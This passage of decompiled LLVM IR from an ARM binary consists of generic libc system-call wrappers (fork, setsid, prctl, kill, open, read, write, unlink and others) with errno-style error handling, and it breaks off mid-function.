  store i32 -1, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_135c8

dec_label_pc_135c8:                               ; preds = %dec_label_pc_135b4, %dec_label_pc_1359c, %dec_label_pc_13594
  %storemerge = phi i32 [ %v0_13594, %dec_label_pc_13594 ], [ %v2_135a4, %dec_label_pc_1359c ], [ -1, %dec_label_pc_135b4 ]
  ret i32 %storemerge

; uselistorder directives
  uselistorder i32 %v2_135a4, { 1, 0, 2 }
}

define i32 @function_135d8() local_unnamed_addr {
dec_label_pc_135d8:
  %r4.global-to-local = alloca i32, align 4
  %v0_135f8 = load i32, i32* @r0, align 4
  store i32 %v0_135f8, i32* %r4.global-to-local, align 4
  %tmp = icmp ult i32 %v0_135f8, -4095
  br i1 %tmp, label %dec_label_pc_13614, label %dec_label_pc_13604

dec_label_pc_13604:                               ; preds = %dec_label_pc_135d8
  %v0_13604 = call i32 @function_13c28()
  %v0_13608 = load i32, i32* %r4.global-to-local, align 4
  %v1_13608 = sub i32 0, %v0_13608
  %v2_1360c = inttoptr i32 %v0_13604 to i32*
  store i32 %v1_13608, i32* %v2_1360c, align 4
  store i32 -1, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_13614

dec_label_pc_13614:                               ; preds = %dec_label_pc_135d8, %dec_label_pc_13604
  %v0_13614 = phi i32 [ %v0_135f8, %dec_label_pc_135d8 ], [ -1, %dec_label_pc_13604 ]
  ret i32 %v0_13614

; uselistorder directives
  uselistorder i32 %v0_135f8, { 1, 0, 2 }
  uselistorder label %dec_label_pc_13614, { 1, 0 }
}

define i32 @function_13628(i8* %arg1) local_unnamed_addr {
dec_label_pc_13628:
  %r4.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_13628 = load i32, i32* @r4, align 4
  store i32 %v3_13628, i32* %stack_var_-8, align 4
  %v3_1362c = call i32 @chdir(i8* %arg1)
  store i32 %v3_1362c, i32* %r4.global-to-local, align 4
  %tmp = icmp ult i32 %v3_1362c, -4095
  br i1 %tmp, label %dec_label_pc_1364c, label %dec_label_pc_1363c

dec_label_pc_1363c:                               ; preds = %dec_label_pc_13628
  %v0_1363c = call i32 @function_13c28()
  %v0_13640 = load i32, i32* %r4.global-to-local, align 4
  %v1_13640 = sub i32 0, %v0_13640
  %v2_13644 = inttoptr i32 %v0_1363c to i32*
  store i32 %v1_13640, i32* %v2_13644, align 4
  store i32 -1, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_1364c

dec_label_pc_1364c:                               ; preds = %dec_label_pc_13628, %dec_label_pc_1363c
  %v0_1364c = phi i32 [ %v3_1362c, %dec_label_pc_13628 ], [ -1, %dec_label_pc_1363c ]
  %v2_13650 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_13650, i32* @r4, align 4
  ret i32 %v0_1364c

; uselistorder directives
  uselistorder i32 %v3_1362c, { 1, 0, 2 }
  uselistorder label %dec_label_pc_1364c, { 1, 0 }
}

define i32 @function_13654(i32 %arg1) local_unnamed_addr {
dec_label_pc_13654:
  %r4.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_13654 = load i32, i32* @r4, align 4
  store i32 %v3_13654, i32* %stack_var_-8, align 4
  %v1_13658 = call i32 @close(i32 %arg1)
  store i32 %v1_13658, i32* %r4.global-to-local, align 4
  %tmp = icmp ult i32 %v1_13658, -4095
  br i1 %tmp, label %dec_label_pc_13678, label %dec_label_pc_13668

dec_label_pc_13668:                               ; preds = %dec_label_pc_13654
  %v0_13668 = call i32 @function_13c28()
  %v0_1366c = load i32, i32* %r4.global-to-local, align 4
  %v1_1366c = sub i32 0, %v0_1366c
  %v2_13670 = inttoptr i32 %v0_13668 to i32*
  store i32 %v1_1366c, i32* %v2_13670, align 4
  store i32 -1, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_13678

dec_label_pc_13678:                               ; preds = %dec_label_pc_13654, %dec_label_pc_13668
  %v0_13678 = phi i32 [ %v1_13658, %dec_label_pc_13654 ], [ -1, %dec_label_pc_13668 ]
  %v2_1367c = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_1367c, i32* @r4, align 4
  ret i32 %v0_13678

; uselistorder directives
  uselistorder i32 %v1_13658, { 1, 0, 2 }
  uselistorder label %dec_label_pc_13678, { 1, 0 }
}

define i32 @function_13680() local_unnamed_addr {
dec_label_pc_13680:
  %r4.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_13680 = load i32, i32* @r4, align 4
  store i32 %v3_13680, i32* %stack_var_-8, align 4
  %v0_13684 = call i32 @fork()
  store i32 %v0_13684, i32* %r4.global-to-local, align 4
  %tmp = icmp ult i32 %v0_13684, -4095
  br i1 %tmp, label %dec_label_pc_136a4, label %dec_label_pc_13694

dec_label_pc_13694:                               ; preds = %dec_label_pc_13680
  %v0_13694 = call i32 @function_13c28()
  %v0_13698 = load i32, i32* %r4.global-to-local, align 4
  %v1_13698 = sub i32 0, %v0_13698
  %v2_1369c = inttoptr i32 %v0_13694 to i32*
  store i32 %v1_13698, i32* %v2_1369c, align 4
  store i32 -1, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_136a4

dec_label_pc_136a4:                               ; preds = %dec_label_pc_13680, %dec_label_pc_13694
  %v0_136a4 = phi i32 [ %v0_13684, %dec_label_pc_13680 ], [ -1, %dec_label_pc_13694 ]
  %v2_136a8 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_136a8, i32* @r4, align 4
  ret i32 %v0_136a4

; uselistorder directives
  uselistorder i32 %v0_13684, { 1, 0, 2 }
  uselistorder label %dec_label_pc_136a4, { 1, 0 }
}

define i32 @function_136ac() local_unnamed_addr {
dec_label_pc_136ac:
  %r4.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_136ac = load i32, i32* @r4, align 4
  store i32 %v3_136ac, i32* %stack_var_-8, align 4
  %v0_136b0 = call i32 @getpid()
  store i32 %v0_136b0, i32* %r4.global-to-local, align 4
  %tmp = icmp ult i32 %v0_136b0, -4095
  br i1 %tmp, label %dec_label_pc_136d0, label %dec_label_pc_136c0

dec_label_pc_136c0:                               ; preds = %dec_label_pc_136ac
  %v0_136c0 = call i32 @function_13c28()
  %v0_136c4 = load i32, i32* %r4.global-to-local, align 4
  %v1_136c4 = sub i32 0, %v0_136c4
  %v2_136c8 = inttoptr i32 %v0_136c0 to i32*
  store i32 %v1_136c4, i32* %v2_136c8, align 4
  store i32 -1, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_136d0

dec_label_pc_136d0:                               ; preds = %dec_label_pc_136ac, %dec_label_pc_136c0
  %v0_136d0 = phi i32 [ %v0_136b0, %dec_label_pc_136ac ], [ -1, %dec_label_pc_136c0 ]
  %v2_136d4 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_136d4, i32* @r4, align 4
  ret i32 %v0_136d0

; uselistorder directives
  uselistorder i32 %v0_136b0, { 1, 0, 2 }
  uselistorder label %dec_label_pc_136d0, { 1, 0 }
}

define i32 @function_136d8() local_unnamed_addr {
dec_label_pc_136d8:
  %r4.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_136d8 = load i32, i32* @r4, align 4
  store i32 %v3_136d8, i32* %stack_var_-8, align 4
  %v0_136dc = call i32 @getppid()
  store i32 %v0_136dc, i32* %r4.global-to-local, align 4
  %tmp = icmp ult i32 %v0_136dc, -4095
  br i1 %tmp, label %dec_label_pc_136fc, label %dec_label_pc_136ec

dec_label_pc_136ec:                               ; preds = %dec_label_pc_136d8
  %v0_136ec = call i32 @function_13c28()
  %v0_136f0 = load i32, i32* %r4.global-to-local, align 4
  %v1_136f0 = sub i32 0, %v0_136f0
  %v2_136f4 = inttoptr i32 %v0_136ec to i32*
  store i32 %v1_136f0, i32* %v2_136f4, align 4
  store i32 -1, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_136fc

dec_label_pc_136fc:                               ; preds = %dec_label_pc_136d8, %dec_label_pc_136ec
  %v0_136fc = phi i32 [ %v0_136dc, %dec_label_pc_136d8 ], [ -1, %dec_label_pc_136ec ]
  %v2_13700 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_13700, i32* @r4, align 4
  ret i32 %v0_136fc

; uselistorder directives
  uselistorder i32 %v0_136dc, { 1, 0, 2 }
  uselistorder label %dec_label_pc_136fc, { 1, 0 }
}

define i32 @function_13704(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5) local_unnamed_addr {
dec_label_pc_13704:
  %r4.global-to-local = alloca i32, align 4
  %v2_13720 = call i32 (i32, i32, ...) @ioctl(i32 %arg1, i32 %arg2)
  store i32 %v2_13720, i32* %r4.global-to-local, align 4
  %tmp = icmp ult i32 %v2_13720, -4095
  br i1 %tmp, label %dec_label_pc_13740, label %dec_label_pc_13730

dec_label_pc_13730:                               ; preds = %dec_label_pc_13704
  %v0_13730 = call i32 @function_13c28()
  %v0_13734 = load i32, i32* %r4.global-to-local, align 4
  %v1_13734 = sub i32 0, %v0_13734
  %v2_13738 = inttoptr i32 %v0_13730 to i32*
  store i32 %v1_13734, i32* %v2_13738, align 4
  store i32 -1, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_13740

dec_label_pc_13740:                               ; preds = %dec_label_pc_13704, %dec_label_pc_13730
  %v0_13740 = phi i32 [ %v2_13720, %dec_label_pc_13704 ], [ -1, %dec_label_pc_13730 ]
  ret i32 %v0_13740

; uselistorder directives
  uselistorder i32 %v2_13720, { 1, 0, 2 }
  uselistorder label %dec_label_pc_13740, { 1, 0 }
}

define i32 @function_13754(i32 %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_13754:
  %r4.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_13754 = load i32, i32* @r4, align 4
  store i32 %v3_13754, i32* %stack_var_-8, align 4
  %v2_13758 = call i32 @kill(i32 %arg1, i32 %arg2)
  %v7_1375c = icmp eq i32 %v2_13758, -4096
  store i1 %v7_1375c, i1* @cpsr_z, align 1
  store i32 %v2_13758, i32* %r4.global-to-local, align 4
  %tmp = icmp ult i32 %v2_13758, -4095
  br i1 %tmp, label %dec_label_pc_13778, label %dec_label_pc_13768

dec_label_pc_13768:                               ; preds = %dec_label_pc_13754
  %v0_13768 = call i32 @function_13c28()
  %v0_1376c = load i32, i32* %r4.global-to-local, align 4
  %v1_1376c = sub i32 0, %v0_1376c
  %v2_13770 = inttoptr i32 %v0_13768 to i32*
  store i32 %v1_1376c, i32* %v2_13770, align 4
  store i32 -1, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_13778

dec_label_pc_13778:                               ; preds = %dec_label_pc_13754, %dec_label_pc_13768
  %v0_13778 = phi i32 [ %v2_13758, %dec_label_pc_13754 ], [ -1, %dec_label_pc_13768 ]
  %v2_1377c = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_1377c, i32* @r4, align 4
  ret i32 %v0_13778

; uselistorder directives
  uselistorder i32 %v2_13758, { 2, 0, 3, 1 }
  uselistorder label %dec_label_pc_13778, { 1, 0 }
}

define i32 @function_13780(i8* %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_13780:
  %r4.global-to-local = alloca i32, align 4
  %v1_13790 = and i32 %arg2, 64
  %v2_13790 = icmp eq i32 %v1_13790, 0
  br i1 %v2_13790, label %.thread1, label %bb

bb:                                               ; preds = %dec_label_pc_13780
  %v6_13780 = load i32, i32* @r2, align 4
  %phitmp = urem i32 %v6_13780, 65536
  br label %.thread1

.thread1:                                         ; preds = %dec_label_pc_13780, %bb
  %v0_137a0 = phi i32 [ 0, %dec_label_pc_13780 ], [ %phitmp, %bb ]
  store i32 %v0_137a0, i32* @r2, align 4
  %v4_137a8 = call i32 (i8*, i32, ...) @open(i8* %arg1, i32 %arg2)
  %v7_137ac = icmp eq i32 %v4_137a8, -4096
  store i1 %v7_137ac, i1* @cpsr_z, align 1
  store i32 %v4_137a8, i32* %r4.global-to-local, align 4
  %tmp = icmp ult i32 %v4_137a8, -4095
  br i1 %tmp, label %dec_label_pc_137c8, label %dec_label_pc_137b8

dec_label_pc_137b8:                               ; preds = %.thread1
  %v0_137b8 = call i32 @function_13c28()
  %v0_137bc = load i32, i32* %r4.global-to-local, align 4
  %v1_137bc = sub i32 0, %v0_137bc
  %v2_137c0 = inttoptr i32 %v0_137b8 to i32*
  store i32 %v1_137bc, i32* %v2_137c0, align 4
  store i32 -1, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_137c8

dec_label_pc_137c8:                               ; preds = %.thread1, %dec_label_pc_137b8
  %v0_137c8 = phi i32 [ %v4_137a8, %.thread1 ], [ -1, %dec_label_pc_137b8 ]
  ret i32 %v0_137c8

; uselistorder directives
  uselistorder i32 %v4_137a8, { 2, 0, 3, 1 }
  uselistorder i32 %arg2, { 1, 0 }
  uselistorder label %dec_label_pc_137c8, { 1, 0 }
  uselistorder label %.thread1, { 1, 0 }
}

define i32 @function_137dc(i32 %arg1) local_unnamed_addr {
dec_label_pc_137dc:
  store i32 %arg1, i32* @r2, align 4
  %v0_137e4 = load i32, i32* @r0, align 4
  %v2_137e4 = inttoptr i32 %v0_137e4 to i8*
  %v3_137e4 = call i32 @function_13780(i8* %v2_137e4, i32 577)
  %v0_137e8 = load i1, i1* @cpsr_z, align 1
  br i1 %v0_137e8, label %bb, label %bb2

bb:                                               ; preds = %dec_label_pc_137dc
  %v6_137e8 = and i32 %v3_137e4, 36
  br label %bb2

bb2:                                              ; preds = %dec_label_pc_137dc, %bb
  %v7_137e8 = phi i32 [ %v3_137e4, %dec_label_pc_137dc ], [ %v6_137e8, %bb ]
  ret i32 %v7_137e8

; uselistorder directives
  uselistorder label %bb2, { 1, 0 }
}

define i32 @function_137ec(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_137ec:
  %r4.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_137ec = load i32, i32* @r4, align 4
  store i32 %v3_137ec, i32* %stack_var_-8, align 4
  %v4_137f4 = call i32 @prctl(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 0)
  store i32 %v4_137f4, i32* %r4.global-to-local, align 4
  %tmp = icmp ult i32 %v4_137f4, -4095
  br i1 %tmp, label %dec_label_pc_13814, label %dec_label_pc_13804

dec_label_pc_13804:                               ; preds = %dec_label_pc_137ec
  %v0_13804 = call i32 @function_13c28()
  %v0_13808 = load i32, i32* %r4.global-to-local, align 4
  %v1_13808 = sub i32 0, %v0_13808
  %v2_1380c = inttoptr i32 %v0_13804 to i32*
  store i32 %v1_13808, i32* %v2_1380c, align 4
  store i32 -1, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_13814

dec_label_pc_13814:                               ; preds = %dec_label_pc_137ec, %dec_label_pc_13804
  %v0_13814 = phi i32 [ %v4_137f4, %dec_label_pc_137ec ], [ -1, %dec_label_pc_13804 ]
  %v2_13818 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_13818, i32* @r4, align 4
  ret i32 %v0_13814

; uselistorder directives
  uselistorder i32 %v4_137f4, { 1, 0, 2 }
  uselistorder label %dec_label_pc_13814, { 1, 0 }
}

define i32 @function_1381c(i32 %arg1, i32* %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_1381c:
  %r4.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_1381c = load i32, i32* @r4, align 4
  store i32 %v3_1381c, i32* %stack_var_-8, align 4
  %v4_13820 = call i32 @read(i32 %arg1, i32* %arg2, i32 %arg3)
  store i32 %v4_13820, i32* %r4.global-to-local, align 4
  %tmp = icmp ult i32 %v4_13820, -4095
  br i1 %tmp, label %dec_label_pc_13840, label %dec_label_pc_13830

dec_label_pc_13830:                               ; preds = %dec_label_pc_1381c
  %v0_13830 = call i32 @function_13c28()
  %v0_13834 = load i32, i32* %r4.global-to-local, align 4
  %v1_13834 = sub i32 0, %v0_13834
  %v2_13838 = inttoptr i32 %v0_13830 to i32*
  store i32 %v1_13834, i32* %v2_13838, align 4
  store i32 -1, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_13840

dec_label_pc_13840:                               ; preds = %dec_label_pc_1381c, %dec_label_pc_13830
  %v0_13840 = phi i32 [ %v4_13820, %dec_label_pc_1381c ], [ -1, %dec_label_pc_13830 ]
  %v2_13844 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_13844, i32* @r4, align 4
  ret i32 %v0_13840

; uselistorder directives
  uselistorder i32 %v4_13820, { 1, 0, 2 }
  uselistorder label %dec_label_pc_13840, { 1, 0 }
}

define i32 @function_13848(i8* %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_13848:
  %r4.global-to-local = alloca i32, align 4
  %tmp = inttoptr i32 %arg2 to i8*
  %stack_var_-8 = alloca i32, align 4
  %v3_13848 = load i32, i32* @r4, align 4
  store i32 %v3_13848, i32* %stack_var_-8, align 4
  %v7_1384c = call i32 @readlink(i8* %arg1, i8* %tmp, i32 %arg3)
  store i32 %v7_1384c, i32* %r4.global-to-local, align 4
  %tmp6 = icmp ult i32 %v7_1384c, -4095
  br i1 %tmp6, label %dec_label_pc_1386c, label %dec_label_pc_1385c

dec_label_pc_1385c:                               ; preds = %dec_label_pc_13848
  %v0_1385c = call i32 @function_13c28()
  %v0_13860 = load i32, i32* %r4.global-to-local, align 4
  %v1_13860 = sub i32 0, %v0_13860
  %v2_13864 = inttoptr i32 %v0_1385c to i32*
  store i32 %v1_13860, i32* %v2_13864, align 4
  store i32 -1, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_1386c

dec_label_pc_1386c:                               ; preds = %dec_label_pc_13848, %dec_label_pc_1385c
  %v0_1386c = phi i32 [ %v7_1384c, %dec_label_pc_13848 ], [ -1, %dec_label_pc_1385c ]
  %v2_13870 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_13870, i32* @r4, align 4
  ret i32 %v0_1386c

; uselistorder directives
  uselistorder i32 %v7_1384c, { 1, 0, 2 }
  uselistorder label %dec_label_pc_1386c, { 1, 0 }
}

define i32 @function_13874(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5) local_unnamed_addr {
dec_label_pc_13874:
  %r4.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_13874 = load i32, i32* @r4, align 4
  store i32 %v3_13874, i32* %stack_var_-8, align 4
  store i32 %arg1, i32* %r4.global-to-local, align 4
  %tmp = icmp ult i32 %arg1, -4095
  br i1 %tmp, label %dec_label_pc_1389c, label %dec_label_pc_1388c

dec_label_pc_1388c:                               ; preds = %dec_label_pc_13874
  %v0_1388c = call i32 @function_13c28()
  %v0_13890 = load i32, i32* %r4.global-to-local, align 4
  %v1_13890 = sub i32 0, %v0_13890
  %v2_13894 = inttoptr i32 %v0_1388c to i32*
  store i32 %v1_13890, i32* %v2_13894, align 4
  store i32 -1, i32* %r4.global-to-local, align 4
  %v2_138a0.pre = load i32, i32* %stack_var_-8, align 4
  br label %dec_label_pc_1389c

dec_label_pc_1389c:                               ; preds = %dec_label_pc_13874, %dec_label_pc_1388c
  %v2_138a0 = phi i32 [ %v3_13874, %dec_label_pc_13874 ], [ %v2_138a0.pre, %dec_label_pc_1388c ]
  %v0_1389c = phi i32 [ %arg1, %dec_label_pc_13874 ], [ -1, %dec_label_pc_1388c ]
  store i32 %v2_138a0, i32* @r4, align 4
  ret i32 %v0_1389c

; uselistorder directives
  uselistorder i32 %arg1, { 1, 0, 2 }
  uselistorder label %dec_label_pc_1389c, { 1, 0 }
}

define i32 @function_138a4(i32 %arg1) local_unnamed_addr {
dec_label_pc_138a4:
  %r4.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_138a4 = load i32, i32* @r4, align 4
  store i32 %v3_138a4, i32* %stack_var_-8, align 4
  %v0_138a8 = call i32 @setsid()
  store i32 %v0_138a8, i32* %r4.global-to-local, align 4
  %tmp = icmp ult i32 %v0_138a8, -4095
  br i1 %tmp, label %dec_label_pc_138c8, label %dec_label_pc_138b8

dec_label_pc_138b8:                               ; preds = %dec_label_pc_138a4
  %v0_138b8 = call i32 @function_13c28()
  %v0_138bc = load i32, i32* %r4.global-to-local, align 4
  %v1_138bc = sub i32 0, %v0_138bc
  %v2_138c0 = inttoptr i32 %v0_138b8 to i32*
  store i32 %v1_138bc, i32* %v2_138c0, align 4
  store i32 -1, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_138c8

dec_label_pc_138c8:                               ; preds = %dec_label_pc_138a4, %dec_label_pc_138b8
  %v0_138c8 = phi i32 [ %v0_138a8, %dec_label_pc_138a4 ], [ -1, %dec_label_pc_138b8 ]
  %v2_138cc = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_138cc, i32* @r4, align 4
  ret i32 %v0_138c8

; uselistorder directives
  uselistorder i32 %v0_138a8, { 1, 0, 2 }
  uselistorder label %dec_label_pc_138c8, { 1, 0 }
}

define i32 @function_138d0(i32 %arg1, %_TYPEDEF_sigset_t* %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_138d0:
  %r2.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %tmp = inttoptr i32 %arg3 to %_TYPEDEF_sigset_t*
  store i32 %arg3, i32* %r2.global-to-local, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_138d0 = icmp eq %_TYPEDEF_sigset_t* %arg2, null
  br i1 %v3_138d0, label %.thread, label %bb

.thread:                                          ; preds = %dec_label_pc_138d0
  %v3_138d85 = load i32, i32* @r4, align 4
  store i32 %v3_138d85, i32* %stack_var_-8, align 4
  br label %dec_label_pc_138f8

bb:                                               ; preds = %dec_label_pc_138d0
  %v3_138d8 = load i32, i32* @r4, align 4
  store i32 %v3_138d8, i32* %stack_var_-8, align 4
  %tmp12 = icmp ult i32 %arg1, 3
  br i1 %tmp12, label %dec_label_pc_138f8, label %dec_label_pc_138e4

dec_label_pc_138e4:                               ; preds = %bb
  %v0_138e4 = call i32 @function_13c28()
  store i32 -1, i32* %r2.global-to-local, align 4
  %v2_138f0 = inttoptr i32 %v0_138e4 to i32*
  store i32 22, i32* %v2_138f0, align 4
  %v0_1391c.pre = load i32, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_1391c

dec_label_pc_138f8:                               ; preds = %.thread, %bb
  %v7_138f8 = call i32 @sigprocmask(i32 %arg1, %_TYPEDEF_sigset_t* %arg2, %_TYPEDEF_sigset_t* %tmp)
  store i32 %v7_138f8, i32* %r4.global-to-local, align 4
  %tmp13 = icmp ult i32 %v7_138f8, -4095
  br i1 %tmp13, label %dec_label_pc_13918, label %dec_label_pc_13908

dec_label_pc_13908:                               ; preds = %dec_label_pc_138f8
  %v0_13908 = call i32 @function_13c28()
  %v0_1390c = load i32, i32* %r4.global-to-local, align 4
  %v1_1390c = sub i32 0, %v0_1390c
  %v2_13910 = inttoptr i32 %v0_13908 to i32*
  store i32 %v1_1390c, i32* %v2_13910, align 4
  store i32 -1, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_13918

dec_label_pc_13918:                               ; preds = %dec_label_pc_138f8, %dec_label_pc_13908
  %v0_13918 = phi i32 [ %v7_138f8, %dec_label_pc_138f8 ], [ -1, %dec_label_pc_13908 ]
  store i32 %v0_13918, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_1391c

dec_label_pc_1391c:                               ; preds = %dec_label_pc_138e4, %dec_label_pc_13918
  %v0_1391c = phi i32 [ %v0_1391c.pre, %dec_label_pc_138e4 ], [ %v0_13918, %dec_label_pc_13918 ]
  %v2_13920 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_13920, i32* @r4, align 4
  ret i32 %v0_1391c

; uselistorder directives
  uselistorder i32 %v7_138f8, { 1, 0, 2 }
  uselistorder i32* %stack_var_-8, { 1, 2, 0 }
  uselistorder i32* %r2.global-to-local, { 1, 2, 3, 0 }
  uselistorder i32 %arg3, { 1, 0 }
  uselistorder %_TYPEDEF_sigset_t* %arg2, { 1, 0 }
  uselistorder i32 %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_1391c, { 1, 0 }
  uselistorder label %dec_label_pc_13918, { 1, 0 }
  uselistorder label %dec_label_pc_138f8, { 1, 0 }
}

define i32 @function_13924(i32* %arg1) local_unnamed_addr {
dec_label_pc_13924:
  %r4.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_13924 = load i32, i32* @r4, align 4
  store i32 %v3_13924, i32* %stack_var_-8, align 4
  %v2_13928 = call i32 @time(i32* %arg1)
  store i32 %v2_13928, i32* %r4.global-to-local, align 4
  %tmp = icmp ult i32 %v2_13928, -4095
  br i1 %tmp, label %dec_label_pc_13948, label %dec_label_pc_13938

dec_label_pc_13938:                               ; preds = %dec_label_pc_13924
  %v0_13938 = call i32 @function_13c28()
  %v0_1393c = load i32, i32* %r4.global-to-local, align 4
  %v1_1393c = sub i32 0, %v0_1393c
  %v2_13940 = inttoptr i32 %v0_13938 to i32*
  store i32 %v1_1393c, i32* %v2_13940, align 4
  store i32 -1, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_13948

dec_label_pc_13948:                               ; preds = %dec_label_pc_13924, %dec_label_pc_13938
  %v0_13948 = phi i32 [ %v2_13928, %dec_label_pc_13924 ], [ -1, %dec_label_pc_13938 ]
  %v2_1394c = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_1394c, i32* @r4, align 4
  ret i32 %v0_13948

; uselistorder directives
  uselistorder i32 %v2_13928, { 1, 0, 2 }
  uselistorder label %dec_label_pc_13948, { 1, 0 }
}

define i32 @function_13950(i8* %arg1) local_unnamed_addr {
dec_label_pc_13950:
  %r4.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_13950 = load i32, i32* @r4, align 4
  store i32 %v3_13950, i32* %stack_var_-8, align 4
  %v3_13954 = call i32 @unlink(i8* %arg1)
  store i32 %v3_13954, i32* %r4.global-to-local, align 4
  %tmp = icmp ult i32 %v3_13954, -4095
  br i1 %tmp, label %dec_label_pc_13974, label %dec_label_pc_13964

dec_label_pc_13964:                               ; preds = %dec_label_pc_13950
  %v0_13964 = call i32 @function_13c28()
  %v0_13968 = load i32, i32* %r4.global-to-local, align 4
  %v1_13968 = sub i32 0, %v0_13968
  %v2_1396c = inttoptr i32 %v0_13964 to i32*
  store i32 %v1_13968, i32* %v2_1396c, align 4
  store i32 -1, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_13974

dec_label_pc_13974:                               ; preds = %dec_label_pc_13950, %dec_label_pc_13964
  %v0_13974 = phi i32 [ %v3_13954, %dec_label_pc_13950 ], [ -1, %dec_label_pc_13964 ]
  %v2_13978 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_13978, i32* @r4, align 4
  ret i32 %v0_13974

; uselistorder directives
  uselistorder i32 %v3_13954, { 1, 0, 2 }
  uselistorder label %dec_label_pc_13974, { 1, 0 }
}

define i32 @function_1397c(i32 %arg1, i32* %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_1397c:
  %r4.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_1397c = load i32, i32* @r4, align 4
  store i32 %v3_1397c, i32* %stack_var_-8, align 4
  %v4_13980 = call i32 @write(i32 %arg1, i32* %arg2, i32 %arg3)
  store i32 %v4_13980, i32* %r4.global-to-local, align 4
  %tmp = icmp ult i32 %v4_13980, -4095
  br i1 %tmp, label %dec_label_pc_139a0, label %dec_label_pc_13990

dec_label_pc_13990:                               ; preds = %dec_label_pc_1397c
  %v0_13990 = call i32 @function_13c28()
  %v0_13994 = load i32, i32* %r4.global-to-local, align 4
  %v1_13994 = sub i32 0, %v0_13994
  %v2_13998 = inttoptr i32 %v0_13990 to i32*
  store i32 %v1_13994, i32* %v2_13998, align 4
  store i32 -1, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_139a0

dec_label_pc_139a0:                               ; preds = %dec_label_pc_1397c, %dec_label_pc_13990
  %v0_139a0 = phi i32 [ %v4_13980, %dec_label_pc_1397c ], [ -1, %dec_label_pc_13990 ]
  %v2_139a4 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_139a4, i32* @r4, align 4
  ret i32 %v0_139a0

; uselistorder directives
  uselistorder i32 %v4_13980, { 1, 0, 2 }
  uselistorder label %dec_label_pc_139a0, { 1, 0 }
}

define i32 @function_139a8(i32* %arg1) local_unnamed_addr {
dec_label_pc_139a8:
  %r2.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i32* %arg1 to i32
  %stack_var_-36 = alloca i32, align 4
  %stack_var_-20 = alloca i32, align 4
  %v3_139a8 = load i32, i32* @r4, align 4
  store i32 %v3_139a8, i32* %stack_var_-20, align 4
  %v6_139a8 = load i32, i32* @r5, align 4
  %v9_139a8 = load i32, i32* @r6, align 4
  %v12_139a8 = load i32, i32* @r7, align 4
  store i32 %tmp, i32* @r5, align 4
  %v2_139b0 = load i32, i32* %arg1, align 4
  store i32 %v2_139b0, i32* %r4.global-to-local, align 4
  %v2_139b4 = ptrtoint i32* %stack_var_-36 to i32
  %v1_139b8 = add i32 %tmp, 24
  store i32 %v1_139b8, i32* @r6, align 4
  %v3_139bc = icmp eq i32 %v2_139b0, -1
  store i32 %v2_139b4, i32* @r7, align 4
  store i32 %v1_139b8, i32* %r2.global-to-local, align 4
  store i32 %v2_139b4, i32* @r0, align 4
  br i1 %v3_139bc, label %dec_label_pc_139d4, label %dec_label_pc_139e8

dec_label_pc_139d4:                               ; preds = %dec_label_pc_139a8
  %v0_139d4 = call i32 @function_13c28()
